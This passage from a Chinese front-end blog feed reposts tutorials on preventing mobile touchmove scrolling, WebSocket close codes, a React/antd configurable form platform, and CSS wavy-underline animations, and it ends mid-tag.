&lt;h3 id=&quot;解决方案-1&quot;&gt;&lt;a href=&quot;#解决方案-1&quot; class=&quot;headerlink&quot; title=&quot;解决方案&quot;&gt;&lt;/a&gt;解决方案&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;监听事件禁止滑动&lt;br&gt;移动端触摸事件有三个，分别定义为&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;ol&gt;
&lt;li&gt;touchstart ：手指放在一个DOM元素上。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;touchmove ：手指拖曳一个DOM元素。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;touchend ：手指从一个DOM元素上移开。&lt;br&gt;显然我们需要控制的是 &lt;code&gt;touchmove&lt;/code&gt; 事件，由此我在 W3C 文档中找到了这样一段话&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;Note that the rate at which the user agent sends touchmove events is implementation-defined, and may depend on hardware capabilities and other implementation details&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;If the preventDefault method is called on the first touchmove event of an active touch point, it should prevent any default action caused by any touchmove event associated with the same active touch point, such as scrolling.&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;touchmove&lt;/code&gt; 事件的速度是可以实现定义的，取决于硬件性能和其他实现细节&lt;/p&gt;
&lt;p&gt;&lt;code&gt;preventDefault&lt;/code&gt; 方法，阻止同一触点上所有默认行为，比如滚动。&lt;/p&gt;
&lt;p&gt;由此我们找到解决方案，通过监听 touchmove，让需要滑动的地方滑动，不需要滑动的地方禁止滑动。&lt;/p&gt;
&lt;p&gt;值得注意的是我们要过滤掉具有滚动容器的元素。&lt;/p&gt;
&lt;p&gt;实现如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;js&quot;&gt;document.body.addEventListener(&amp;#39;touchmove&amp;#39;, function(e) {
    if(e._isScroller) return;
    // 阻止默认事件
    e.preventDefault();
}, {
    passive: false
});
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
      <category term="HTML5" scheme="https://zhanghao-web.github.io/categories/HTML5/"/>
    
    
      <category term="HTML5" scheme="https://zhanghao-web.github.io/tags/HTML5/"/>
    
  </entry>
  
  <entry>
    <title>websocket断开原因分析</title>
    <link href="https://zhanghao-web.github.io/2020/04/28/HTTP/websocket%E6%96%AD%E5%BC%80%E5%8E%9F%E5%9B%A0%E5%88%86%E6%9E%90/"/>
    <id>https://zhanghao-web.github.io/2020/04/28/HTTP/websocket断开原因分析/</id>
    <published>2020-04-28T09:07:15.000Z</published>
    <updated>2020-04-28T09:30:11.258Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://segmentfault.com/a/1190000014582485" target="_blank" rel="noopener">原文地址</a></p><h1 id="把错误打印出来"><a href="#把错误打印出来" class="headerlink" title="把错误打印出来"></a>把错误打印出来</h1><p>WebSocket断开的原因有很多，最好在WebSocket断开时，将错误打印出来。</p><p><img src="https://segmentfault.com/img/remote/1460000014582490?w=812&amp;h=408" alt="demo"></p><pre><code class="js">ws.onclose = function (e) {  console.log(&#39;websocket 断开: &#39; + e.code + &#39; &#39; + e.reason + &#39; &#39; + e.wasClean)  console.log(e)}</code></pre><p>如果你想自己玩玩<code>WebSocket</code>, 但是你又不想自己部署一个<code>WebSocket</code>服务器，你可以使用<code>ws = new WebSocket(&#39;wss://echo.websocket.org/&#39;)</code>, 你向echo.websocket.org发送消息，它会回复你同样的消息。</p><h1 id="重要信息错误状态码"><a href="#重要信息错误状态码" class="headerlink" title="重要信息错误状态码"></a>重要信息错误状态码</h1><p><code>WebSocket</code>断开时，会触发<code>CloseEvent</code>, <code>CloseEvent</code>会在连接关闭时发送给使用 <code>WebSockets</code> 的客户端. 它在 <code>WebSocket</code> 对象的 onclose 事件监听器中使用。<code>CloseEvent</code>的code字段表示了<code>WebSocket</code>断开的原因。可以从该字段中分析断开的原因。</p><p><code>CloseEvent</code>有三个字段需要注意, 通过分析这三个字段，一般就可以找到断开原因</p><blockquote><ul><li><code>CloseEvent.code</code>: code是错误码，是整数类型</li><li><code>CloseEvent.reason</code>: reason是断开原因，是字符串</li><li><code>CloseEvent.wasClean</code>: wasClean表示是否正常断开，是布尔值。一般异常断开时，该值为false</li></ul></blockquote><p><img src="https://segmentfault.com/img/remote/1460000014074898?w=1768&amp;h=732" alt="closed-code"></p><h1 id="关闭状态码表"><a href="#关闭状态码表" class="headerlink" title="关闭状态码表"></a>关闭状态码表</h1><p>一般来说<code>1006</code>的错误码出现的情况比较常见，该错误码一般出现在断网时。</p><table><thead><tr><th>状态码</th><th style="text-align:right">名称</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td>0–999</td><td style="text-align:right"></td><td style="text-align:center">保留段, 未使用</td></tr><tr><td>1000</td><td style="text-align:right">CLOSE_NORMAL</td><td style="text-align:center">正常关闭; 无论为何目的而创建, 该链接都已成功完成任务.</td></tr><tr><td>1001</td><td style="text-align:right">CLOSE_GOING_AWAY</td><td style="text-align:center">终端离开, 可能因为服务端错误, 也可能因为浏览器正从打开连接的页面跳转离开.</td></tr><tr><td>1002</td><td style="text-align:right">CLOSE_PROTOCOL_ERROR</td><td style="text-align:center">由于协议错误而中断连接.</td></tr><tr><td>1003</td><td style="text-align:right">CLOSE_UNSUPPORTED</td><td style="text-align:center">由于接收到不允许的数据类型而断开连接 (如仅接收文本数据的终端接收到了二进制数据).</td></tr><tr><td>1004</td><td style="text-align:right"></td><td style="text-align:center">保留. 其意义可能会在未来定义.</td></tr><tr><td>1005</td><td style="text-align:right"></td><td style="text-align:center">CLOSE_NO_STATUS</td></tr><tr><td>1006</td><td style="text-align:right">CLOSE_ABNORMAL</td><td style="text-align:center">保留. 用于期望收到状态码时连接非正常关闭 (也就是说, 没有发送关闭帧).</td></tr><tr><td>1007</td><td style="text-align:right">Unsupported Data</td><td style="text-align:center">由于收到了格式不符的数据而断开连接 (如文本消息中包含了非 UTF-8 数据).</td></tr><tr><td>1008</td><td style="text-align:right">Policy Violation</td><td style="text-align:center">由于收到不符合约定的数据而断开连接. 这是一个通用状态码, 用于不适合使用 1003 和 1009 状态码的场景.</td></tr><tr><td>1009</td><td style="text-align:right">CLOSE_TOO_LARGE</td><td style="text-align:center">由于收到过大的数据帧而断开连接.</td></tr><tr><td>1010</td><td style="text-align:right">Missing Extension</td><td style="text-align:center">客户端期望服务器商定一个或多个拓展, 但服务器没有处理, 因此客户端断开连接.</td></tr><tr><td>1011</td><td style="text-align:right">Internal Error</td><td style="text-align:center">客户端由于遇到没有预料的情况阻止其完成请求, 因此服务端断开连接.</td></tr><tr><td>1012</td><td style="text-align:right">Service Restart</td><td style="text-align:center">服务器由于重启而断开连接.</td></tr><tr><td>1013</td><td style="text-align:right">Try Again Later</td><td style="text-align:center">服务器由于临时原因断开连接, 如服务器过载因此断开一部分客户端连接.</td></tr><tr><td>1014</td><td style="text-align:right"></td><td style="text-align:center">由 WebSocket标准保留以便未来使用.</td></tr><tr><td>1015</td><td style="text-align:right"></td><td style="text-align:center">TLS Handshake    保留. 表示连接由于无法完成 TLS 握手而关闭 (例如无法验证服务器证书).</td></tr><tr><td>1016–1999</td><td style="text-align:right"></td><td style="text-align:center">由 WebSocket标准保留以便未来使用.</td></tr><tr><td>2000–2999</td><td style="text-align:right"></td><td style="text-align:center">由 WebSocket拓展保留使用.</td></tr><tr><td>3000–3999</td><td style="text-align:right"></td><td style="text-align:center">可以由库或框架使用.? 不应由应用使用. 可以在 IANA 注册, 先到先得.</td></tr><tr><td>4000–4999</td><td style="text-align:right"></td><td style="text-align:center">可以由应用使用.</td></tr></tbody></table><h1 id="其他注意事项"><a href="#其他注意事项" class="headerlink" title="其他注意事项"></a>其他注意事项</h1><p>如果你的服务所在的域是HTTPS的，那么使用的WebSocket协议也必须是wss, 而不能是ws</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://segmentfault.com/a/1190000014582485&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;原文地址&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;把错误打印出来&quot;&gt;&lt;a href=&quot;#把错误打印出来&quot; cla
      
    
    </summary>
    
      <category term="HTTP" scheme="https://zhanghao-web.github.io/categories/HTTP/"/>
    
    
      <category term="websocket" scheme="https://zhanghao-web.github.io/tags/websocket/"/>
    
  </entry>
  
  <entry>
    <title>&#39;基于react搭建一个通用的表单管理配置平台（vue同）&#39;</title>
    <link href="https://zhanghao-web.github.io/2020/04/25/React/%E5%9F%BA%E4%BA%8Ereact%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E9%80%9A%E7%94%A8%E7%9A%84%E8%A1%A8%E5%8D%95%E7%AE%A1%E7%90%86%E9%85%8D%E7%BD%AE%E5%B9%B3%E5%8F%B0%EF%BC%88vue%E5%90%8C%EF%BC%89/"/>
    <id>https://zhanghao-web.github.io/2020/04/25/React/基于react搭建一个通用的表单管理配置平台（vue同）/</id>
    <published>2020-04-25T14:36:43.000Z</published>
    <updated>2020-04-27T00:49:14.957Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://juejin.im/post/5ea1af9f518825737a316cc3?utm_source=gold_browser_extension" target="_blank" rel="noopener">原文地址</a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在做B端的产品，借助该博主的文章学习下通用表单，以下为博文信息</p><p>这篇文章是一篇应用性极强的文章，我们通过一个实际的应用场景，去解决某一类的问题，提供一种或者几种解决方案，来探索技术的魅力。接下来笔者主要分析表单定制平台的实现思路和技术方案，来实现一个类似于金数据或者问卷星一样的表单配置平台，大家也可以基于此方案，扩展出功能更加强大的可视化平台。</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>为什么要做一个这样的平台呢？一方面是因为笔者多年来一直服务于B端产品，对于动态表单以及配置化表单有一定的项目积累，并且深知配置化表单的价值所在。举一个很传统的B端表单配置化的例子：传统2B企业在提供saas服务时，为了满足不同企业的定制化需求，往往会给企业客户提供定制化或者自由配置的功能，如下图：</p><p><img src="https://user-gold-cdn.xitu.io/2020/4/24/171a9a5e9f7d001a?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="定制化"></p><p>对于saas系统而言，软件即服务，在提供基础服务的同时，同样要满足用户个性化需求，所以传统的saas软件提供商往往会提供给客户自由配置的空间，这种自由配置的桥梁就是通过表单，举一个简单的例子：</p><p><img src="https://user-gold-cdn.xitu.io/2020/4/24/171a9b767e4bb302?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="网站表单"></p><p>通过这种方法就可以定制不同风格的企业产品，这里只是举了个比较简单的例子，往往实际项目中会更加复杂，可能会有几十个配置项，当然这种模式是比较传统的配置化方案，也仅仅是saas软件提供的很小的一个服务模块。目前主流的做法是采用可视化方案，而且国内也有非常成熟的方案，但基本的思想是一致的，只不过后者的体验更好，操作难度更低。</p><p>本文介绍的表单定制平台,也同样支持表单管理,表单数据分析, 表单数据收集, 表单定制等功能, 笔者将采用比较熟悉的技术栈<code>react</code>以及第三方ui库<code>antd4.0</code>来开发, 后端采用<code>node + koa</code>来设计路由接口.</p><h2 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h2><p><img src="https://user-gold-cdn.xitu.io/2020/4/24/171aa801e1e7556f?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="设计思路概况"></p><h2 id="实现效果与分析"><a href="#实现效果与分析" class="headerlink" title="实现效果与分析"></a>实现效果与分析</h2><h3 id="表单定制管理列表"><a href="#表单定制管理列表" class="headerlink" title="表单定制管理列表"></a>表单定制管理列表</h3><p><img src="https://user-gold-cdn.xitu.io/2020/4/24/171aa823f2fedb04?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="表单定制管理列表"></p><p>管理列表主要用来查看我们配置的表单模板,分析不同表单模板收集的数据,对表单模板进行编辑删除等操作.</p><h3 id="表单定制页面"><a href="#表单定制页面" class="headerlink" title="表单定制页面"></a>表单定制页面</h3><p><img src="https://user-gold-cdn.xitu.io/2020/4/24/171aa83ef454bcbf?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="表单定制页面"></p><p>由上图可知表单定制页面主要用来编辑自定义表单模板,我们可以添加表单标题,表单字段等,目前提供了几种自定义表单控件如下:</p><ul><li>文本框</li><li>多行文本框</li><li>下拉框</li><li>单选框</li><li>复选框</li><li>文件上传控件</li></ul><p>基本涵盖了我们所需要的所有表单业务场景.由上图可知我们可以在任意位置插入自定义字段,同时可以编辑修改删除表单字段.如果想象力再大一点,我们可以基于它来实现不仅仅是表单问卷型应用,还可以实现答题,发布内容等场景.(后期可支持富文本控件)</p><h3 id="草稿管理"><a href="#草稿管理" class="headerlink" title="草稿管理"></a>草稿管理</h3><p><img src="https://user-gold-cdn.xitu.io/2020/4/24/171aa85da2f9c847?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="草稿管理"></p><p>草稿箱设计的目的是方便使用者在配置表单的过程中不确定是否符合需求或者由于某种临时性举动而无法继续配置,这个时候可以将以配置好的内容存入草稿箱,下次继续编辑,所以笔者专门设计了草稿箱管理列表,一旦用户存在草稿,会在管理页面通知用户并显示草稿的数量.作为一个追求体验的技术人,这一块的设计还是相当有必要的.</p><h3 id="生成前台表单访问链接"><a href="#生成前台表单访问链接" class="headerlink" title="生成前台表单访问链接"></a>生成前台表单访问链接</h3><p><img src="https://user-gold-cdn.xitu.io/2020/4/24/171aa88fb0768a72?imageslim" alt="生成前台表单访问链接"></p><p>当我们配置好表单之后,我们点击保存, 会生成一个前台访问地址,实时访问表单信息,如下图为点击链接之后的页面:</p><p><img src="https://user-gold-cdn.xitu.io/2020/4/24/171ab3d3341b02e4?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="展示"></p><p>我们也可以根据自己的风格,设计自己的表单录入页面, 具体如何实现这样的过程, 后面我会详细介绍.</p><h3 id="查看用户已有数据录入"><a href="#查看用户已有数据录入" class="headerlink" title="查看用户已有数据录入"></a>查看用户已有数据录入</h3><p><img src="https://user-gold-cdn.xitu.io/2020/4/24/171aa8e7dcecc4b4?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="查看用户已有数据录入1"></p><p><img src="https://user-gold-cdn.xitu.io/2020/4/24/171aa8dce347d3c6?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="查看用户已有数据录入2"></p><p>我们可以通过点击”查看数据”来访问收集到的表单数据,并通过可视化的工具对数据做分析比较,同时我们也可以在数据列表中删除数据,来控制我们数据展示的纯净.</p><h3 id="表单数据分析"><a href="#表单数据分析" class="headerlink" title="表单数据分析"></a>表单数据分析</h3><p><img src="https://user-gold-cdn.xitu.io/2020/4/24/171aa91ab9128d19?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="表单数据分析"></p><p>收集到数据只有,我们会自动集成几个可视化组件来分析表单数据,以上是笔者列出的几个可视化组件,基于<code>antv G2</code>来封装.</p><h2 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h2><p>以上主要介绍了自定义表单定制平台的一些功能和交互效果, 我们可以利用该平台做很多有意思的事情.因为表单的抽象是数据,我们拿到定制化的表单json数据之后,我们可以有不同的展现形式,比如用户的<strong>问卷调查, 网站平台的投票, 答题页面, 发布动态</strong>等功能,如下图配置:</p><p><img src="https://user-gold-cdn.xitu.io/2020/4/24/171ab881a1e07227?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="配置1"><br><img src="https://user-gold-cdn.xitu.io/2020/4/24/171ab88d11dc893b?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="配置2"></p><p>以上配置可以实现类似于微信的发布朋友圈的功能, 然后我们可以通过前端的手段根据用户发表的数据渲染成一个朋友圈列表.<br>如果我们再打开自己的脑洞，我们可以这样配置，配置一个这样的表单，表单包括一个文件上传控件和n个文本输入控件，如下图：</p><p><img src="https://user-gold-cdn.xitu.io/2020/4/24/171ace33e78b037d?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="活动页面配置"></p><p>将这样的表单配置到H5管理模块，我们<strong>只需要上传三张图，然后填写好对应的配文，然后利用市面上成熟的H5全屏滚动插件，就能轻松的定制各种H5活动页面了</strong>。该方案已被笔者的很多子系统使用，效果还是非常好的。<br>当然基于该平台甚至能直接配置小型的宣传网站，还有更多想象空间，期待大家去挖掘。</p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>要想开发这样一个表单定制平台, 核心在于如何实现表单动态配置的机制.这里笔者将其划分为两部分:<strong>基础表单物料和表单编辑生成器</strong>, 如下图所示拆分图:</p><p><img src="https://user-gold-cdn.xitu.io/2020/4/24/171abbf0cdd52a43?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="表单定制模块"></p><h3 id="基础表单物料"><a href="#基础表单物料" class="headerlink" title="基础表单物料"></a>基础表单物料</h3><p>基础表单物料主要是为了用户选择自定义表单控件使用，我们常用的表单动态渲染有map循环+条件判断和单层map+对象法，前者如果要渲染一个动态表单，可能实现如下：</p><pre><code class="js">{    list.map((item, i) =&gt; {        return &lt;React.Fragment key={i}&gt;            {               item.type === &#39;input&#39; &amp;&amp; &lt;Input /&gt;            }            {               item.type === &#39;radio&#39; &amp;&amp; &lt;Radio /&gt;            }            // ...        &lt;/React.Fragment&gt;    })}</code></pre><p>但是这样做有个明显的缺点就是会产生很多没必要的判断，如果对于复杂表单，性能往往很低，所以笔者采用后者来实现，复杂度可以降到O(n).我们先来做配置模版：</p><pre><code class="js">// 基础模版数据const tpl = [  {    label: &#39;文本框&#39;,    placeholder: &#39;请输入内容&#39;,    type: &#39;text&#39;,    value: &#39;&#39;,    index: uuid(5)  },  {    label: &#39;单选框&#39;,    type: &#39;radio&#39;,    option: [{label: &#39;男&#39;, value: 0}, {label: &#39;女&#39;, value: 1}],    index: uuid(5)  },  {    label: &#39;复选框&#39;,    type: &#39;checkbox&#39;,    option: [{label: &#39;男&#39;, value: 0}, {label: &#39;女&#39;, value: 1}],    index: uuid(5)  },  {    label: &#39;多行文本&#39;,    placeholder: &#39;请输入内容&#39;,    type: &#39;textarea&#39;,    index: uuid(5)  },  {    label: &#39;选择框&#39;,    placeholder: &#39;请选择&#39;,    type: &#39;select&#39;,    option: [{label: &#39;中国&#39;, value: 0}, {label: &#39;俄罗斯&#39;, value: 1}],    index: uuid(5)  },  {    label: &#39;文件上传&#39;,    type: &#39;upload&#39;,    index: uuid(5)  }]// 模版渲染组件const tplMap = {  text: {    component: (props) =&gt; {      const { placeholder, label } = props      return &lt;div className={styles.fieldOption}&gt;&lt;span className={styles.fieldLabel}&gt;{label}:&lt;/span&gt;&lt;Input placeholder={placeholder} /&gt;&lt;/div&gt;    }  },  textarea: {    component: (props) =&gt; {      const { placeholder, label } = props      return &lt;div className={styles.fieldOption}&gt;&lt;span className={styles.fieldLabel}&gt;{label}:&lt;/span&gt;&lt;TextArea placeholder={placeholder} /&gt;&lt;/div&gt;    }  },  radio: {    component: (props) =&gt; {      const { option, label } = props      return &lt;div className={styles.fieldOption}&gt;              &lt;span className={styles.fieldLabel}&gt;{label}:&lt;/span&gt;              &lt;Radio.Group&gt;                {                  option &amp;&amp; option.map((item, i) =&gt; {                    return &lt;Radio style={radioStyle} value={item.value} key={item.label}&gt;                      { item.label }                    &lt;/Radio&gt;                  })                }            &lt;/Radio.Group&gt;        &lt;/div&gt;    }  },  checkbox: {    component: (props) =&gt; {      const { option, label } = props      return &lt;div className={styles.fieldOption}&gt;              &lt;span className={styles.fieldLabel}&gt;{label}:&lt;/span&gt;              &lt;Checkbox.Group&gt;                &lt;Row&gt;                  {                    option &amp;&amp; option.map(item =&gt; {                      return &lt;Col span={16} key={item.label}&gt;                              &lt;Checkbox value={item.value} style={{ lineHeight: '32px' }}&gt;                                { item.label }                              &lt;/Checkbox&gt;                            &lt;/Col&gt;                    })                  }                &lt;/Row&gt;            &lt;/Checkbox.Group&gt;        &lt;/div&gt;    }  },  select: {    component: (props) =&gt; {      const { placeholder, option, label } = props      return &lt;div className={styles.fieldOption}&gt;              &lt;span className={styles.fieldLabel}&gt;{label}:&lt;/span&gt;              &lt;Select placeholder={placeholder} style={{width: '100%'}}&gt;                {                  option &amp;&amp; option.map(item =&gt; {                    return &lt;Option value={item.value} key={item.label}&gt;{item.label}&lt;/Option&gt;                  })                }            &lt;/Select&gt;        &lt;/div&gt;    }  },  upload: {    component: (props) =&gt; {      return &lt;div className={styles.fieldOption}&gt;              &lt;span className={styles.fieldLabel}&gt;{props.label}:&lt;/span&gt;              &lt;Upload              listType=&quot;picture-card&quot;              className=&quot;avatar-uploader&quot;              showUploadList={false}              action=&quot;https://www.mocky.io/v2/5cc8019d300000980a055e76&quot;            &gt;              &lt;div&gt;+&lt;/div&gt;            &lt;/Upload&gt;        &lt;/div&gt;    }  }}export {  tpl,  tplMap}</code></pre><p>基础物料在下图所示中使用：</p><p><img src="https://user-gold-cdn.xitu.io/2020/4/25/171ad0ca3515ae67?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="基础物料使用"></p><p>当我们要添加一个表单项时，我们就可以在左边预览操作区看到添加的项，并可以基于表单编辑生成器来编辑表单字段。</p><h3 id="表单编辑生成器"><a href="#表单编辑生成器" class="headerlink" title="表单编辑生成器"></a>表单编辑生成器</h3><p>表单编辑生成器分为2部分， 第一部分是用来生成表单项的容器组件，封装了添加，删除，编辑操作功能，代码如下：</p><pre><code class="js">// 表单容器组件const BaseFormEl = (props) =&gt; {  const {isEdit, onEdit, onDel, onAdd} = props  const handleEdit = (v) =&gt; {    onEdit &amp;&amp; onEdit(v)  }  return &lt;div className={styles.formControl}&gt;    &lt;div className={styles.formItem}&gt;{ props.children }&lt;/div&gt;    &lt;div className={styles.actionBar}&gt;      &lt;span className={styles.actionItem} onClick={onDel}&gt;&lt;MinusCircleOutlined /&gt;&lt;/span&gt;      &lt;span className={styles.actionItem} onClick={onAdd}&gt;&lt;PlusCircleOutlined /&gt;&lt;/span&gt;      &lt;span className={styles.actionItem} onClick={handleEdit}&gt;&lt;EditOutlined /&gt;&lt;/span&gt;    &lt;/div&gt;  &lt;/div&gt;}</code></pre><p>第二部分主要用来渲染操作区模版，基于BaseFormEl包装不同类型的表单组件, 这里举一个比较复杂的select来说明，其他表单控件类似：</p><pre><code class="js">const formMap = {  title: {},  text: {},  textarea: {},  radio: {},  checkbox: {},  select: {    component: (props) =&gt; {      const { onDel, onAdd, onEdit, curIndex, index, type, label, placeholder, required, message, option } = props      return &lt;BaseFormEl         onDel={onDel.bind(this, index)}        onAdd={onAdd.bind(this, index)}        onEdit={onEdit.bind(this, {index, type, placeholder, label, option, required})}        isEdit={curIndex === index}      &gt;        &lt;Form.Item name={label} label={label} rules={[{ message, required }]}&gt;          &lt;Select placeholder={placeholder}&gt;            {              option &amp;&amp; option.map(item =&gt; {                return &lt;Option value={item.value} key={item.label}&gt;{item.label}&lt;/Option&gt;              })            }          &lt;/Select&gt;        &lt;/Form.Item&gt;      &lt;/BaseFormEl&gt;    },    editAttrs: [      {        title: &#39;字段名称&#39;,        key: &#39;label&#39;      },      {        title: &#39;选项&#39;,        key: &#39;option&#39;      },      {        title: &#39;提示文本&#39;,        key: &#39;placeholder&#39;      },      {        title: &#39;是否必填&#39;,        key: &#39;required&#39;      },    ]  },  upload: {}}</code></pre><p>editAttrs主要用来渲染编辑列表，说明哪些表单项可以编辑，这部分代码比较简单，这里直接用图举例：</p><p><img src="https://user-gold-cdn.xitu.io/2020/4/25/171ad19928734c82?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt="在线表单制作平台"></p><p>最后我们来渲染表单生成器组件：</p><pre><code class="js">export default (props) =&gt; {  const {     formData,     handleDelete,     handleAdd,     handleEdit,     curEditRowIdx   } = props  return &lt;Form name=&quot;customForm&quot;&gt;            {              formData &amp;&amp; formData.map(item =&gt; {                let CP = formMap[item.type].component                return &lt;CP {...item} key={item.index}                  onDel={handleDelete}                   onAdd={handleAdd}                  onEdit={handleEdit}                  curIndex={curEditRowIdx}                /&gt;              })            }         &lt;/Form&gt;}</code></pre><p>至此，基本功能模块已经开发完成，我们只需要将这些物料和组件导入到编辑页面，基于业务来操作和请求即可。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://juejin.im/post/5ea1af9f518825737a316cc3?utm_source=gold_browser_extension&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;原文地址&lt;/a&gt;&lt;/p&gt;
&lt;
      
    
    </summary>
    
      <category term="React/Vue" scheme="https://zhanghao-web.github.io/categories/React-Vue/"/>
    
    
      <category term="React/Vue" scheme="https://zhanghao-web.github.io/tags/React-Vue/"/>
    
  </entry>
  
  <entry>
    <title>强大的CSS:文字下波浪线动画效果</title>
    <link href="https://zhanghao-web.github.io/2020/04/23/CSS3/%E5%BC%BA%E5%A4%A7%E7%9A%84CSS-%E6%96%87%E5%AD%97%E4%B8%8B%E6%B3%A2%E6%B5%AA%E7%BA%BF%E5%8A%A8%E7%94%BB%E6%95%88%E6%9E%9C/"/>
    <id>https://zhanghao-web.github.io/2020/04/23/CSS3/强大的CSS-文字下波浪线动画效果/</id>
    <published>2020-04-23T05:01:46.000Z</published>
    <updated>2020-04-23T05:24:05.693Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.imooc.com/article/286988" target="_blank" rel="noopener">原文地址</a></p><p><img src="http://upload-images.jianshu.io/upload_images/13133049-963e2b89fb9da2ad.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="wave"></p><p>类似下面这种效果<br><img src="http://upload-images.jianshu.io/upload_images/13133049-03fa0c4c990af8f1.gif?imageMogr2/auto-orient/strip" alt="text wave"></p><p>有以下几种方式可以实现这种效果</p><h2 id="径向渐变纯CSS的方式"><a href="#径向渐变纯CSS的方式" class="headerlink" title="径向渐变纯CSS的方式"></a>径向渐变纯CSS的方式</h2><p>就是使用径向渐变绘制我们的波浪线效果，一个波浪线循环段是有一个朝上的半个圆弧和一个朝下的半个圆弧组合而成的。</p><p>所以，我们只要使用径向渐变绘制圆弧，再通过<code>background-position</code>控制两个圆弧的位置，让其前后拼接在一起就可以实现波浪线效果。</p><p>相关CSS代码</p><pre><code class="css">.flow-wave {    background: radial-gradient(circle at 10px -7px, transparent 8px, currentColor 8px, currentColor 9px, transparent 9px) repeat-x,        radial-gradient(circle at 10px 27px, transparent 8px, currentColor 8px, currentColor 9px, transparent 9px) repeat-x;    background-size: 20px 20px;    background-position: -10px calc(100% + 16px), 0 calc(100% - 4px);}</code></pre><p>实时效果如下：<br>有了静态的波浪线效果，剩下的就像这个波浪线动起来，用<code>CSS3 animation</code>动画控制<code>background-position</code>位置即可。</p><pre><code class="css">.flow-wave {    animation: waveFlow 1s infinite linear;}@keyframes waveFlow {    from { background-position-x: -10px, 0; }    to { background-position-x: -30px, -20px; }}</code></pre><p>于是波浪线动画效果就实现了。</p><p>这种方法实现的优点是颜色控制非常方便，例如，我们修改文字颜色为原谅绿，弯弯水波的颜色也变成了原谅绿：</p><p>此方法实现的不足就是：理解成本有点高，如何使用CSS radial-gradient模拟波浪线效果是需要相当的CSS功力积累的，上手不太容易，以后要修改个尺寸什么的也不太好维护。同时，在普通屏幕密度屏幕下的Chrome浏览器上，线条并不平滑，吹毛求疵的设计师不一定会接受。</p><p>此时，可以试试下面这种更利于理解的方法。</p><h2 id="使用SVG波形矢量图作为背景"><a href="#使用SVG波形矢量图作为背景" class="headerlink" title="使用SVG波形矢量图作为背景"></a>使用SVG波形矢量图作为背景</h2><p>就是我们直接使用一个使用SVG波形矢量图作为背景，不用自己去手动CSS绘制，代码量差不多，还更容易理解。CSS代码示意：</p><pre><code class="css">svg-wave {    background: url(&quot;data:image/svg+xml,%3Csvg xmlns=&#39;http://www.w3.org/2000/svg&#39; viewBox=&#39;0 0 20 4&#39;%3E%3Cpath fill=&#39;none&#39; stroke=&#39;%23333&#39; d=&#39;M0 3.5c5 0 5-3 10-3s5 3 10 3 5-3 10-3 5 3 10 3&#39;/%3E%3C/svg%3E&quot;) repeat-x 0 100%;     background-size: 20px auto;}</code></pre><p>实时效果如下：</p><p>有了静态的波浪线效果，剩下的就像这个波浪线动起来，用<code>CSS3 animation</code>动画控制<code>background-position</code>位置即可。</p><pre><code class="css">.svg-wave {    animation: waveMove 1s infinite linear;}@keyframes waveMove {    from { background-position: 0 100%; }    to   { background-position: -20px 100%; }}</code></pre><p>优点是线条边缘平滑，效果细腻，易理解，易上手，易维护。</p><p>缺点也很明显，就是波浪线的颜色无法实时跟着文字的颜色发生变化，适用于文字颜色不会多变的场景。</p><p>如果我们想要改变波浪线的颜色也很简单，修改<code>background</code>代码中的<code>stroke=&#39;%23333&#39;</code>这部分，’%23’就是就是#，因此，<code>stroke=&#39;%23333&#39;</code>其实就是<code>stroke=&#39;#333&#39;</code>的意思。例如，我们需要改成红色略带橙色，可以<code>stroke=&#39;%23F30&#39;</code>，也可以写完整<code>stroke=&#39;%23FF3300&#39;</code>。</p><h2 id="text-decoration"><a href="#text-decoration" class="headerlink" title="text-decoration"></a>text-decoration</h2><p><code>text-decoration</code>属性早已支持波浪线下划线：</p><pre><code class="css">text-decoration-style: wavy;</code></pre><p>效果如下截图：</p><p><img 